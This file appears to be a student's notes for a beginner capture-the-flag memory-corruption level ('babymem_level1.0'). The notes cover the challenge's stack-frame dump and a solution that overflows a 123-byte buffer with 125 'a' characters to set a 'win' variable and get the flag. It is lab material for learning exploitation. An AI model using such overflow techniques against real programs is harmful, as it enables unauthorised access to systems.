@@ -1,0 +1,72 @@
+//TESTO
+
+hacker@babymem_level1:~$ /challenge/babymem_level1.0 
+###
+### Welcome to /challenge/babymem_level1.0!
+###
+
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffc0cfbbc40 (rsp+0x0000) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
+| 0x00007ffc0cfbbc48 (rsp+0x0008) | 58 ce fb 0c fc 7f 00 00 | 0x00007ffc0cfbce58 |
+| 0x00007ffc0cfbbc50 (rsp+0x0010) | 48 ce fb 0c fc 7f 00 00 | 0x00007ffc0cfbce48 |
+| 0x00007ffc0cfbbc58 (rsp+0x0018) | 8d ee 45 5e 01 00 00 00 | 0x000000015e45ee8d |
+| 0x00007ffc0cfbbc60 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
+| 0x00007ffc0cfbbc68 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbc70 (rsp+0x0030) | 80 bc fb 0c fc 7f 00 00 | 0x00007ffc0cfbbc80 |
+| 0x00007ffc0cfbbc78 (rsp+0x0038) | fc bc fb 0c fc 7f 00 00 | 0x00007ffc0cfbbcfc |
+| 0x00007ffc0cfbbc80 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbc88 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbc90 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbc98 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbca0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbca8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbcb0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbcb8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbcc0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbcc8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbcd0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbcd8 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbce0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbce8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbcf0 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbcf8 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffc0cfbbd00 (rsp+0x00c0) | 00 c2 e3 29 60 55 00 00 | 0x0000556029e3c200 |
+| 0x00007ffc0cfbbd08 (rsp+0x00c8) | 00 df e8 82 64 96 37 3d | 0x3d37966482e8df00 |
+| 0x00007ffc0cfbbd10 (rsp+0x00d0) | 50 cd fb 0c fc 7f 00 00 | 0x00007ffc0cfbcd50 |
+| 0x00007ffc0cfbbd18 (rsp+0x00d8) | 96 d2 e3 29 60 55 00 00 | 0x0000556029e3d296 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7ffc0cfbbc40, and our base pointer points to 0x7ffc0cfbbd10.
+This means that we have (decimal) 28 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 224 bytes.
+The input buffer begins at 0x7ffc0cfbbc80, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 123 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, there is a "win" variable.
+By default, the value of this variable is zero.
+However, when this variable is non-zero, the flag will be printed.
+You can make this variable be non-zero by overflowing the input buffer.
+The "win" variable is stored at 0x7ffc0cfbbcfc, 124 bytes after the start of your input buffer.
+
+//SOLUZIONE
+
+Payload size: 1
+Send your payload (up to 1 bytes)!
+a
+hacker@babymem_level1:~$ ipython
+In [1]: 0x7ffc0cfbbcfc - 0x7ffc0cfbbc80 //win variable - input buffer
+Out[1]: 124
+In [2]: 'a'*125
+Out[2]: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+In [3]: exit
+hacker@babymem_level1:~$ /challenge/babymem_level1.0
+Payload size: 125
+Send your payload (up to 125 bytes)!
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
